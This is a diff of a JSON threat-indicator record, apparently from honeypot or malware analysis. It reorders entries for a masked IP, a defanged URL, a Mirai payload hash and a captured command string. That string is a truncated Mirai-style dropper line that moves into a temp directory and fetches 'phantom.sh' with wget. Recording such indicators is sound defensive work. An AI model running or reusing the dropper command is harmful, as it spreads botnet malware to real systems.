@@ -1,11 +1,5 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "91.92.42.XXX"
-  },
-  {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
@@ -24,16 +18,22 @@
     "value": "hxxp://91.92.42.XXX/phantom.sh;"
   },
   {
-    "context": "Inbound payload hash (mirai)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "7ffb5289d2eaef8369340c0628cfba7f1026250c4fb585ef71d304c610077acb"
+    "type": "ip",
+    "value": "91.92.42.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "[4hroot@db12-web01:~# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91.92.42.XXX/phantom.sh; curl -"
+  },
+  {
+    "context": "Inbound payload hash (mirai)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "7ffb5289d2eaef8369340c0628cfba7f1026250c4fb585ef71d304c610077acb"
   },
   {
     "country": "private",
